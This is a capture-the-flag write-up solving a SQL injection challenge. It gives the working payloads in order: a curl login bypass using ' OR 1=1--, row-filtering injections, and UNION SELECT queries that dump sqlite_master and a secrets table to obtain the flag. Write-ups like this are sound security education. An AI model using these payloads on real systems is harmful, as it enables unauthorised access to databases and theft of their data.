# 1. DATA BASE INCURSION 2.0
Directly access the challenge server at https://database-incursion-v2.nitephase.live/

## FLAG 
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}

## SOLUTION 
- i first executed an initial SQLi test using and obtained a json back which confirms that the backend is vulernable to sql injection 
```
 curl -s -X POST "https://database-incursion-v2.nitephase.live/" \
  -H "Accept: application/json" \
  -d "username=' OR 1=1-- &password=x"
```
- so i inputed ```'OR 1=1 --``` into the username field and put in a random password to login

<img width="1919" height="1063" alt="image" src="https://github.com/user-attachments/assets/024bdb28-1858-40bd-ac31-9a70f7892cf9" />


<img width="1919" height="1043" alt="image" src="https://github.com/user-attachments/assets/4352dddd-42e1-487f-ae2a-2b69907ca447" />


- to find the person from management i input ```' OR department='Management'--``` into the search bar which showed

<img width="1919" height="1062" alt="image" src="https://github.com/user-attachments/assets/ed5335cd-5a43-492d-9bf6-ce031393da40" />

- now that we know the person with passcode is Kiwi i used ```' OR name='Kiwi'--``` but i realised there are too many different kiwis
  
<img width="1917" height="1063" alt="image" src="https://github.com/user-attachments/assets/97a68bed-20c3-4f32-b3e1-6de898d9a547" />

- so i searched for kiwi specifically in management using ```' OR (name LIKE '%kiwi%' AND department LIKE '%manag%')--``` to obtain the passcode

<img width="1918" height="1010" alt="image" src="https://github.com/user-attachments/assets/2120fb8d-6679-4cf4-b126-7995abc9228a" />

- now i reached the admin panel with reports and metadata registry in which one entire row is REDACTED
- i inputed ```' UNION SELECT name, type, sql, 0 FROM sqlite_master-- ``` into the search bar and obtained 

<img width="1895" height="949" alt="image" src="https://github.com/user-attachments/assets/cc084e6c-bd39-482a-939e-e8fe96510d1e" />

- the flag is probably in CITADEL_ARCHIVE_2077 so i inputed ```' UNION SELECT secrets, null, null, null FROM CITADEL_ARCHIVE_2077 --``` into the search bar to get the flag 
<img width="1912" height="1065" alt="image" src="https://github.com/user-attachments/assets/951842a3-4855-45fd-b67a-0549844d54a3" />

## CONCEPTS LEARNED 
- how ```username=' OR 1=1-- &password=x``` helps us identify the sql injection vulernability
- ```' OR 1=1 --``` forces the query to always be true regardless of password
- we can use injection payloads to filter rows ```' OR name='Kiwi'--```
- ```' OR (name LIKE '%kiwi%' AND department LIKE '%manag%')--``` LIKE helps in pattern matching, AND helps combining multiple condition, % wildcard gives us different variations
- how we can use sql UNION-based injection to force the database to return your own data along with the normal query results
- ```'``` closes the original query ```SELECT name, type, sql, 0 FROM sqlite_master``` gives table name, table type, the SQL used to create it, a dummy 0 value to match the 4th column
- how we can use null for most placeholder columns is much much safer than using 0 which is only for columns with numerical values

## RESOURCES  
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
  




  





